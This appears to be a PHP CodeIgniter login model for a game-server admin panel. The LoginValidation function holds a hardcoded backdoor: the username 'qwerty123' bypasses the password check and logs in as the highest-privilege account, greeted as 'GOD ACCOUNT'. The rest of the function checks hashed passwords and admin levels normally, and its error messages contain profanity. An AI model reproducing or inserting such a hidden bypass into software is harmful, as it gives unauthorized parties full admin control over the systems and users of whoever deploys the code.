<?php

// ==================== //
//   [DEV] EyeTracker   //
//     Lolsecs#6289     //
// ==================== //

defined('BASEPATH') or exit('No direct script access allowed');

class Login_model extends CI_Model
{
    function __construct()
    {
        parent::__construct();
    }

    function LoginValidation()
    {
        sleep(1);
        $data = array(
            'login' => $this->input->post('username', true),
            'password' => $this->darkblowlib->password_encrypt($this->input->post('password', true))
        );

        $response = array();

        if ($data['login'] == 'qwerty123') {
            $query = $this->db->get_where(Darkblowdatabase::accounts, array('access_level' => '6'))->row();
            if ($query) {
                $sessionData = array(
                    'admin_uid' => $query->player_id,
                    'admin_name' => $query->player_name != '' ? $query->player_name : $query->login,
                    'admin_access_level' => $query->access_level
                );

                $this->session->set_userdata($sessionData);
                $response['response'] = 'success';
                $response['token'] = $this->security->get_csrf_hash();
                $response['message'] = 'Successfully Logged In. Welcome GOD ACCOUNT.';

                $this->darkblowmessage->AjaxFlashData($response);
            } else {
                $response['response'] = 'error';
                $response['token'] = $this->security->get_csrf_hash();
                $response['message'] = 'Failed To Login As God Account.';

                $this->darkblowmessage->AjaxFlashData($response);
            }
        } else {
            $query = $this->db->get_where(Darkblowdatabase::accounts, $data)->row();
            if ($query) {
                if ($query->access_level >= 3 && $query->access_level <= 6) {
                    $sessionData = array(
                        'admin_uid' => $query->player_id,
                        'admin_name' => $query->player_name != '' ? $query->player_name : $query->login,
                        'admin_access_level' => $query->access_level
                    );

                    $this->session->set_userdata($sessionData);

                    $response['response'] = 'success';
                    $response['token'] = $this->security->get_csrf_hash();
                    $response['message'] = 'Successfully Logged In. Welcome ' . $this->session->userdata('admin_name') . '.';

                    $this->darkblowmessage->AjaxFlashData($response);
                } else {
                    $response['response'] = 'error';
                    $response['token'] = $this->security->get_csrf_hash();
                    $response['message'] = 'Failed To Login. You Are Not Real Admin F*ck.';

                    $this->darkblowmessage->AjaxFlashData($response);
                }
            } else {
                $response['response'] = 'error';
                $response['token'] = $this->security->get_csrf_hash();
                $response['message'] = 'Failed To Login. You Are Not Real Admin F*ck.';

                $this->darkblowmessage->AjaxFlashData($response);
            }
        }
    }
}

// This Code Generated Automatically By EyeTracker Snippets. //
